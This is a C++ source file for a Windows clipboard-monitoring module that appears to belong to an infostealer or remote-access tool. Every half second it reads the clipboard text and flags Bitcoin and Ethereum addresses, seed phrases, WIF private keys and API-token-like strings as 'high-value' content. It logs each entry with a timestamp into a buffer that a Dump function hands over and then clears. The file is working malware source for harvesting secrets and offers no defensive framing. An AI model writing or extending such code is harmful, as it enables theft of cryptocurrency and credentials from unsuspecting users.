#include "ClipMon.h"
#include <regex>

static volatile bool g_running  = false;
static HANDLE        g_thread   = NULL;
static std::string   g_buffer;
static CRITICAL_SECTION g_cs;
static bool          g_csInit = false;

// Patterns for high-value clipboard content
static const struct { const char* name; const char* pattern; } kPatterns[] = {
    { "BTC",  "\\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}\\b" },
    { "ETH",  "\\b0x[0-9a-fA-F]{40}\\b" },
    { "SEED", "\\b([a-z]+ ){11,23}[a-z]+\\b" },     // BIP-39 seed phrase (12-24 words)
    { "PRIV", "\\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\\b" },  // WIF private key
    { "API",  "\\b[A-Za-z0-9_\\-]{20,50}\\b" },    // generic API-key-length token
};

static std::string TagContent(const std::string& text) {
    std::string tag;
    for (const auto& p : kPatterns) {
        try {
            std::regex re(p.pattern, std::regex::ECMAScript | std::regex::icase);
            if (std::regex_search(text, re)) {
                if (!tag.empty()) tag += "+";
                tag += p.name;
            }
        } catch (...) {}
    }
    return tag.empty() ? "" : "[" + tag + "] ";
}

static DWORD WINAPI ClipThread(LPVOID) {
    std::string last;

    while (g_running) {
        Sleep(500);

        if (!OpenClipboard(NULL)) continue;

        HANDLE h = GetClipboardData(CF_TEXT);
        if (!h) { CloseClipboard(); continue; }

        char* ptr = (char*)GlobalLock(h);
        if (!ptr) { CloseClipboard(); continue; }

        std::string cur(ptr, strnlen(ptr, 8192));
        GlobalUnlock(h);
        CloseClipboard();

        if (cur == last || cur.empty()) continue;
        last = cur;

        // Timestamp + tag + content
        SYSTEMTIME st = {};
        GetLocalTime(&st);
        char ts[32];
        sprintf_s(ts, "%02d:%02d:%02d", st.wHour, st.wMinute, st.wSecond);

        std::string entry = std::string(ts) + " " + TagContent(cur) + cur + "\n";

        if (g_csInit) {
            EnterCriticalSection(&g_cs);
            g_buffer += entry;
            LeaveCriticalSection(&g_cs);
        }
    }
    return 0;
}

void ClipMon::Start() {
    if (g_running) return;
    if (!g_csInit) {
        InitializeCriticalSection(&g_cs);
        g_csInit = true;
    }
    g_running = true;
    g_thread  = CreateThread(NULL, 0, ClipThread, NULL, 0, NULL);
}

void ClipMon::Stop() {
    g_running = false;
    if (g_thread) {
        WaitForSingleObject(g_thread, 2000);
        CloseHandle(g_thread);
        g_thread = NULL;
    }
}

std::string ClipMon::Dump() {
    if (!g_csInit) return "(not started)";
    EnterCriticalSection(&g_cs);
    std::string out = g_buffer.empty() ? "(empty)" : g_buffer;
    g_buffer.clear();
    LeaveCriticalSection(&g_cs);
    return out;
}

bool ClipMon::IsRunning() { return g_running; }
